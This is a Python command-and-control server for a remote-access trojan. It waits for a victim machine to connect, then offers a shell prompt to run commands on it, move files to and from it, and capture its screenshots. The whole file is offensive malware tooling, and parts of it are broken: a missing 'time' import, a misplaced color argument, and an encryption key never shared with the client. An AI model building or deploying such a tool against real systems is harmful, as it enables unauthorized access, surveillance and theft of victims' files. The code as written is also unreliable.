import socket
import termcolor
import json
import os
import logging
from cryptography.fernet import Fernet
from tqdm import tqdm

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class BotServer:
    def __init__(self, host='127.0.0.1', port=5555):
        self.host = host
        self.port = port
        self.target = None
        self.ip = None
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)

    def reliable_recv(self):
        data = b''
        while True:
            try:
                chunk = self.target.recv(1024)
                if not chunk:
                    raise Exception("Connection closed unexpectedly")
                data += chunk
                if len(chunk) < 1024:
                    break
            except Exception as e:
                logging.error(f"Error receiving data: {e}")
                return None
        return self.cipher_suite.decrypt(data).decode()

    def reliable_send(self, data):
        encrypted_data = self.cipher_suite.encrypt(data.encode())
        self.target.sendall(encrypted_data)

    def upload_file(self, file_path):
        try:
            file_size = os.path.getsize(file_path)
            with open(file_path, 'rb') as f:
                total_sent = 0
                with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Uploading {os.path.basename(file_path)}") as pbar:
                    while True:
                        chunk = f.read(4096)
                        if not chunk:
                            break
                        self.target.sendall(chunk)
                        total_sent += len(chunk)
                        pbar.update(len(chunk))
            logging.info(f"File uploaded successfully: {file_path}")
        except Exception as e:
            logging.error(f"Error uploading file: {e}")

    def download_file(self, file_path):
        try:
            self.target.settimeout(1)
            with open(file_path, 'wb') as f:
                total_received = 0
                file_size = int(self.reliable_recv())  # Receive file size first
                with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Downloading {os.path.basename(file_path)}") as pbar:
                    while True:
                        try:
                            chunk = self.target.recv(4096)
                            if not chunk:
                                break
                            f.write(chunk)
                            total_received += len(chunk)
                            pbar.update(len(chunk))
                            if total_received >= file_size:
                                break
                        except socket.timeout:
                            break
            self.target.settimeout(None)
            logging.info(f"File downloaded successfully: {file_path}")
        except Exception as e:
            logging.error(f"Error downloading file: {e}")

    def screenshot(self, output_file):
        try:
            self.target.settimeout(3)
            with open(output_file, 'wb') as f:
                total_received = 0
                image_size = int(self.reliable_recv())  # Receive image size first
                with tqdm(total=image_size, unit='B', unit_scale=True, desc="Capturing Screenshot") as pbar:
                    while True:
                        try:
                            chunk = self.target.recv(4096)
                            if not chunk:
                                break
                            f.write(chunk)
                            total_received += len(chunk)
                            pbar.update(len(chunk))
                            if total_received >= image_size:
                                break
                        except socket.timeout:
                            break
            self.target.settimeout(None)
            logging.info(f"Screenshot saved successfully: {output_file}")
        except Exception as e:
            logging.error(f"Error capturing screenshot: {e}")

    def handle_command(self, command):
        if command == 'quit':
            return False
        elif command == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
        elif command.startswith('cd'):
            self.reliable_send(command)
        elif command.startswith('upload'):
            file_path = command.split(' ', 1)[1]
            self.upload_file(file_path)
        elif command.startswith('download'):
            file_path = command.split(' ', 1)[1]
            self.download_file(file_path)
        elif command.startswith('screenshot'):
            output_file = f"screenshot_{int(time.time())}.png"
            self.screenshot(output_file)
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine
            screenshot                          --> Capture Screenshot Of Target Machine
            help                                --> Show This Help Menu'''),'green')
        else:
            self.reliable_send(command)
            result = self.reliable_recv()
            print(result)
        return True

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.bind((self.host, self.port))
            logging.info(f"Listening for incoming connections on {self.host}:{self.port}")
            sock.listen(5)
            self.target, self.ip = sock.accept()
            logging.info(f"Target connected from: {self.ip}")

            while True:
                command = input('* Shell~%s: ' % str(self.ip))
                if not self.handle_command(command):
                    break

            self.target.close()
            sock.close()
            logging.info("Server stopped")
        except Exception as e:
            logging.error(f"An error occurred: {e}")
        finally:
            if self.target:
                self.target.close()
            if sock:
                sock.close()

if __name__ == "__main__":
    server = BotServer()
    server.start()
